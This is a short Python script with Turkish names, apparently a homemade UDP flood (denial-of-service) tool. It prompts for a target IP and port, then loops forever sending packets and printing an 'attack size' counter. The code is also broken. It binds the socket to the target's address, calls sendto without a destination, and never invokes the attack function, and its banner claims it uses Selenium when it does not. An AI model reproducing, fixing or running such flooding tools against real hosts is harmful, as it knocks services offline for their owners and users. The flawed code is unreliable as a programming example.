import socket
import os
def banner():
    print("""


    .::Creacted By 4XROIX::.
       VERSION : 0.1
       CODE    : PYTHON,SELENIUM


    """)
def Saldiri():
    hedefip = raw_input("HEDEF IP : ")
    port = input("HEDEF PORT : ")
    os.system("clear")
    banner()
    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    sock.bind((hedefip, port))
    i = 10000
    
    while True:
        i += 1000000
        sock.sendto(i)
        print("SALDIRI BOYUTU : ",i)



